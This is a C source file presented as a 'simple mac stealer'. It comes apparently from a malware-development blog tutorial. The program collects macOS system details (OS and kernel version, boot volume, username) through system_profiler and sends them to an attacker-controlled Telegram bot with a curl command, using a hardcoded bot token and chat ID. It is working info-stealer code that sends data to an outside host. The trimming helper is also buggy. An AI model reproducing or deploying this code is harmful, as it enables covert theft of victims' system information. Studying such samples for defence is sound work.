/*
 * hack.c
 * simple mac stealer
 * author @cocomelonc
 * https://cocomelonc.github.io/macos/2025/06/12/malware-mac-1.html
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE 128

// trim function
void trimF(char* str) {
  char* pos;
  
  // remove newlines
  if ((pos = strchr(str, '\n')) != NULL) {
    *pos = '\0';
  }
  
  // remove carriage returns
  if ((pos = strchr(str, '\r')) != NULL) {
    *pos = '\0';
  }

  char *token = strtok(pos, " \t\n\r");
  if (token) {
    strcpy(pos, token);
  }
}

// function to send message via Telegram Bot API
int sendToTgBot(const char* message, const char* botToken, const char* chatId) {
  char command[1024];
  
  // URL encode message for safe HTTP request
  char encodedMessage[BUFFER_SIZE];
  snprintf(encodedMessage, sizeof(encodedMessage), "\"%s\"", message);  // just for simplicity here
  
  // build the curl command to send the message to Telegram
  snprintf(command, sizeof(command),
    "curl -s -X POST https://api.telegram.org/bot%s/sendMessage --data-urlencode chat_id=%s --data-urlencode text=%s",
    botToken, chatId, encodedMessage);

  // execute the command
  int result = system(command);
  return result;
}

int main() {
  char command[] = "system_profiler SPSoftwareDataType 2>&1";
  char buffer[BUFFER_SIZE];
  FILE* pipe = popen(command, "r");

  if (!pipe) {
    perror("failed to open pipe!");
    return 1;
  }

  // system information
  char systemVersion[BUFFER_SIZE] = {0};
  char kernelVersion[BUFFER_SIZE] = {0};
  char bootVol[BUFFER_SIZE] = {0};
  char username[BUFFER_SIZE] = {0};
  char computerName[BUFFER_SIZE] = {0};

  // get buffer
  while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
    // trim buffer
    trimF(buffer);

    // get system version
    if (strstr(buffer, "System Version:") != NULL) {
      strcpy(systemVersion, buffer + strlen("System Version:") + 7);
    }

    // get kernel version
    if (strstr(buffer, "Kernel Version:") != NULL) {
      strcpy(kernelVersion, buffer + strlen("Kernel Version:") + 7);
    }

    // get boot volume info
    if (strstr(buffer, "Boot Volume:") != NULL) {
      strcpy(bootVol, buffer + strlen("Boot Volume:") + 7);
    }

    // get username
    if (strstr(buffer, "User Name:") != NULL) {
      strcpy(username, buffer + strlen("User Name:") + 7);
    }
  }

  // close
  fclose(pipe);

  // trim all values before sending
  trimF(systemVersion);
  trimF(kernelVersion);
  trimF(bootVol);
  trimF(username);

  // construct the message to be sent to Telegram
  char systemInfo[1024];
  snprintf(systemInfo, sizeof(systemInfo),
           "System Version: %s\nKernel Version: %s\nBoot Volume: %s\nUsername: %s",
           systemVersion, kernelVersion, bootVol, username);

  // Telegram Bot details
  const char* botToken = "7725786727:AAEuylKfQgTg5RBMeXwyk9qKhcV5kULP_po";  // Replace with your bot token
  const char* chatId = "5547299598";      // Replace with your chat ID
  
  // send system information to Telegram
  int result = sendToTgBot(systemInfo, botToken, chatId);

  if (result == 0) {
    printf("system info successfully sent to Telegram\n");
  } else {
    printf("failed to send system info to Telegram\n");
  }

  return 0;
}
